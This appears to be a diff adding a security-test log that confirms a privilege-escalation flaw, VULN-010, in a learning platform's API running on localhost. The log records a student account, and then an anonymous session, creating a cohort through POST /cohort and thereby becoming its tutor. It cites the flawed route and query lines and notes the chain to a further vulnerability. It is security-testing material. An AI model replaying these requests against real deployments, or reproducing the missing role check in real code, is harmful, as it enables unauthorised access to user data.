@@ -1,0 +1,20 @@
+========================================================================
+VULN-010: Cohort creation self-grants cohort TUTOR (any session)
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[INFO] route apps/api/src/routes/cohort/cohort.ts:121 — POST '/' gated by authMiddleware ONLY
+[INFO] query packages/db/src/queries/cohort/cohort.ts:48-52 — creator inserted as cohortMember roleId=TUTOR
+[SETUP] provisioning a plain STUDENT member of the org (make_student)
+[SETUP] student user=e1e45687-cc2a-4d93-b044-36b3097f4881 role_in_org=3 (3=STUDENT) — NOT a tutor/admin anywhere
+[INFO] cohort_member rows where this student is TUTOR, before = 0
+[STEP] POST /cohort  as STUDENT  {organizationId: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd, name: 'pwn-cohort-c_7928be56'}
+[INFO]   response: HTTP 201 {"success":true,"data":{"id":"430473a4-0254-4346-9561-e1501f14a10d","createdAt":"2026-09-27 14:49:26.174458+00","updatedAt":"2026-09-27 14:49:26.174458+00","organizationId":"48bbdff8-2ad5-46a3-a259-2ca3d52677dd","name":"
+[INFO]   created cohort id=430473a4-0254-4346-9561-e1501f14a10d
+[PROOF] cohort_member(cohort=430473a4-0254-4346-9561-e1501f14a10d, profile=e1e45687-cc2a-4d93-b044-36b3097f4881).role_id = '2' (expected '2' = TUTOR)
+[PROOF] cohort.organization_id = '48bbdff8-2ad5-46a3-a259-2ca3d52677dd' (body-supplied, expected 48bbdff8-2ad5-46a3-a259-2ca3d52677dd)
+[STEP] bonus: POST /cohort from an ANONYMOUS better-auth session (no signup)
+[INFO]   anon response: HTTP 201 {"success":true,"data":{"id":"048a78ae-d57a-4864-81b4-ab6169196f14","createdAt":"2026-09-27 14:49:26.305748+00","updatedAt":"2026-09-27 14:49:26.305748+00","org
+[PROOF] anon cohort_member.role_id = '2' (expected '2')
+==> VULN-010: CONFIRMED — STUDENT self-granted cohort TUTOR via POST /cohort (also confirmed from an anonymous session → unauthenticated)
+[OK] exploit confirmed — vertical privesc STUDENT(3) → cohort TUTOR(2) in one request
+[INFO] chain: cohort 430473a4-0254-4346-9561-e1501f14a10d (attacker is TUTOR) is the VULN-009 precondition
